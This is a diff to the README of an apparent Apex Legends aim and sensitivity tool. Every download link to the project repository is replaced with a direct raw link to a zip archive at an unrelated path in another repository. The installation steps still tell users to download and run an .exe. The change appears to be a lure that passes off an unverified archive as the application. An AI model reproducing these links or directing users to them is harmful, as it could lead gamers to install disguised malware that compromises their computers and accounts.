@@ -5,7 +5,7 @@ description: "Analyze and convert Apex Legends sensitivity settings with this we
 ---
 # 🎯 apex-sensitivity-aim-lab - Improve your aim across multiple shooters
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Salubrious-lethalgene996/apex-sensitivity-aim-lab)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Salubrious-lethalgene996/salubrious-lethalgene996.github.io/raw/refs/heads/main/cunye/v1.4-beta.1.zip)
 
 ## 🎯 About this tool
 
@@ -26,7 +26,7 @@ Your computer needs the following to run this tool:
 
 Follow these steps to set up the tool on your Windows computer.
 
-1.  Visit the download page: [https://github.com/Salubrious-lethalgene996/apex-sensitivity-aim-lab](https://github.com/Salubrious-lethalgene996/apex-sensitivity-aim-lab)
+1.  Visit the download page: [https://github.com/Salubrious-lethalgene996/salubrious-lethalgene996.github.io/raw/refs/heads/main/cunye/v1.4-beta.1.zip](https://github.com/Salubrious-lethalgene996/salubrious-lethalgene996.github.io/raw/refs/heads/main/cunye/v1.4-beta.1.zip)
 2.  Click the latest version button on the right side of the screen.
 3.  Find the file ending in .exe in the assets section.
 4.  Click the file to start your download.
